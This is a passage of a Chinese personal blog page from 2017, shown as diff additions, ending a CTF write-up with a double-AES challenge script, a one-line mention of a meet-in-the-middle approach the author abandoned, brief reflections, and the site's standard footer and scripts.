+    <span class="n">k1</span> <span class="o">=</span> <span class="n">dummy_key_extend</span><span class="p">(</span><span class="n">key</span><span class="p">[:</span><span class="mi">4</span><span class="p">])</span>
+    <span class="n">k2</span> <span class="o">=</span> <span class="n">dummy_key_extend</span><span class="p">(</span><span class="n">key</span><span class="p">[</span><span class="mi">4</span><span class="p">:])</span>
+    <span class="n">c1</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">k1</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
+    <span class="n">c2</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">k2</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_ECB</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">c2</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">c1</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">plain</span><span class="p">))</span>
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'./secretkey'</span><span class="p">,</span> <span class="s">'rb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">key</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+    <span class="c"># To make life easier...</span>
+    <span class="k">assert</span> <span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="s">'0'</span>
+    <span class="k">assert</span> <span class="p">(</span><span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s">'8'</span>
+    
+    <span class="n">plain</span> <span class="o">=</span> <span class="s">'I am a piece of lovely plaintext'</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'ciphertext'</span><span class="p">,</span> <span class="s">'wb'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">aes_duet</span><span class="p">(</span><span class="n">plain</span><span class="p">,</span> <span class="n">key</span><span class="p">))</span>
+    <span class="k">print</span> <span class="s">"I am a lovely flag: flag{ </span><span class="si">%</span><span class="s">s}"</span> <span class="o">%</span> <span class="n">key</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>思路很简单，就是AES两轮加密的中间相遇攻击，但是计算量有些庞大，虽然题目为了降低复杂性还提示了key的第一位为0最后一位为8，最终因为时间与硬件原因放弃。</p>
+
+<h2 id="感想">感想</h2>
+
+<p>程序的安全性与正确性同等重要。</p>
+
+<p>我们在众多bug中微妙的生活着。</p>
+
+<p>以及PHP是世界上最好的语言。</p>
+
+<p><img src="/img/in-post/post-blog-j0serv8.gif" alt="img" /></p>
+
+<p>– miyunluo 于2017.12</p>
+
+
+                <hr>
+
+                
+
+
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2017/08/29/pyworoot/" data-toggle="tooltip" data-placement="top" title="Install Python and Pip without Root">&larr; Previous Post</a>
+                    </li>
+                    
+                    
+                </ul>
+
+
+                
+
+                
+                <!-- disqus 评论框 start -->
+                <div class="comment">
+                    <div id="disqus_thread" class="disqus-thread"></div>
+                </div>
+                <!-- disqus 评论框 end -->
+                
+
+            </div>
+
+    <!-- Sidebar Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                <!-- Featured Tags -->
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+        				
+                            
+                				<a href="/tags/#生活" title="生活" rel="5">
+                                    生活
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#Algorithm" title="Algorithm" rel="2">
+                                    Algorithm
+                                </a>
+                            
+        				
+                            
+        				
+                            
+                				<a href="/tags/#编程珠玑" title="编程珠玑" rel="2">
+                                    编程珠玑
+                                </a>
+                            
+        				
+                            
+                				<a href="/tags/#Notes" title="Notes" rel="2">
+                                    Notes
+                                </a>
+                            
+        				
+                            
+        				
+                            
+        				
+        			</div>
+                </section>
+                
+
+                <!-- Friends Blog -->
+                
+                <hr>
+                <h5>FRIENDS</h5>
+                <ul class="list-inline">
+                    
+                        <li><a href="http://www.eamonalbert.com/">GinYM</a></li>
+                    
+                        <li><a href="https://chasingegg.github.io/">Chao.G</a></li>
+                    
+                        <li><a href="http://www.emile-li.me/">emile-li</a></li>
+                    
+                        <li><a href="https://dusmart.github.io/">TingEr</a></li>
+                    
+                </ul>
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+
+<!-- disqus 公共JS代码 start (一个网页只需插入一次) -->
+<script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES * * */
+    var disqus_shortname = "miyunluo";
+    var disqus_identifier = "/2017/12/10/jun0ctf";
+    var disqus_url = "http://localhost:4000/2017/12/10/jun0ctf/";
+
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<!-- disqus 公共JS代码 end -->
+
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+<!-- anchor-js, Doc:http://bryanbraun.github.io/anchorjs/ -->
+<script>
+    async("http://cdn.bootcss.com/anchor-js/1.1.1/anchor.min.js",function(){
+        anchors.options = {
+          visible: 'always',
+          placement: 'right',
+          icon: '#'
+        };
+        anchors.add().remove('.intro-header h1').remove('.subheading').remove('.sidebar-container h5');
+    })
+</script>
+<style>
+    /* place left on bigger screen */
+    @media all and (min-width: 800px) {
+        .anchorjs-link{
+            position: absolute;
+            left: -0.75em;
+            font-size: 1.1em;
+            margin-top : -0.1em;
+        }
+    }
+</style>
+
+<!-- ******************** back-top button ****************** -->
+<div id="back-top">
+  <a href="#head" title="回到顶部">
+    Top
+  </a>
+</div>
+<style type="text/css">
+#back-top a { /* back to top button */
+    text-align: center;
+    line-height: 50px;
+    font-size: 16px;
+    width:50px;
+    height: 50px;
+    position: fixed;
+    bottom: 10px; /* 小按钮到浏览器底边的距离 */
+    right: 60px; /* 小按钮到浏览器右边框的距离 */
+    color: rgb(64,120,192); /* 小按钮中文字的颜色 */
+    z-index: 1000;
+    background: #fff; /* 小按钮底色 */
+    padding: auto; /* 小按钮中文字到按钮边缘的距离 */
+    border-radius: 50px; /* 小按钮圆角的弯曲程度（半径）*/
+    -moz-border-radius: 50px;
+    -webkit-border-radius: 50px;
+    font-weight: bold; /* 小按钮中文字的粗细 */
+    text-decoration: none !important;
+    box-shadow:0 1px 2px rgba(0,0,0,.15), 0 1px 0 #ffffff inset;
+}
+
+#back-top a:hover { /* 小按钮上有鼠标悬停时 */
+    background: rgba(64,120,192,0.8); /* 小按钮的底色 */
+    color: #fff; /* 文字颜色 */
+}
+</style>
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.3/jquery.min.js"></script>
+<script type="text/javascript">
+$("#back-top").hide();
+$(document).ready(function () {
+  $(window).scroll(function () {
+    if ($(this).scrollTop() > 100) {
+      $('#back-top').fadeIn();
+    } else {
+      $('#back-top').fadeOut();
+    }
+  });
+
+  $('#back-top a').click(function () {
+    $('body,html').animate({
+      scrollTop: 0
+    }, 500);
+    return false;
+  });
+});
+</script>
+<!-- ****************************************************** -->
+
+
+    <!-- Footer -->
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">
+                    
+                    
+
+                    <!-- add Weibo, Zhihu by Hux, add target = "_blank" to <a> by Hux -->
+                    
+                    
+                    <li>
+                        <a target="_blank" href="http://weibo.com/5522737680">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-weibo fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+
+
+                    
+                    <li>
+                        <a target="_blank" href="https://www.facebook.com/yudong.luo.77">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/miyunluo">
+                            <span class="fa-stack fa-lg">
+                                <i class="fa fa-circle fa-stack-2x"></i>
+                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                </ul>
+                <p class="copyright text-muted">
+                    Copyright &copy; Blog Nullptr 2017
+                    <br>
+                    Theme by <a href="http://huangxuan.me">Hux</a>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- jQuery -->
+<script src="/js/jquery.min.js "></script>
+
+<!-- Bootstrap Core JavaScript -->
+<script src="/js/bootstrap.min.js "></script>
+
+<!-- Custom Theme JavaScript -->
+<script src="/js/hux-blog.min.js "></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/ 
+     - https://github.com/jneen/rouge/wiki/list-of-supported-languages-and-lexers   
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async('/js/jquery.tagcloud.js',function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+<script>
+    // dynamic User by Hux
+    var _gaId = 'UA-102635433-1';
+    var _gaDomain = 'miyunluo.com';
+    // Originial
+    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+    ga('create', _gaId, _gaDomain);
+    ga('send', 'pageview');
+</script>
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+<!-- Side Catalog -->
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="/img/icon_wechat.png" width="0" height="0" />
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+</body>
+<!-- MathJax Section -->
+<script type="text/javascript"
+src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script>
+    MathJax.Hub.Config({
+          tex2jax: {
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre']
+          }
+    });
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+</html>
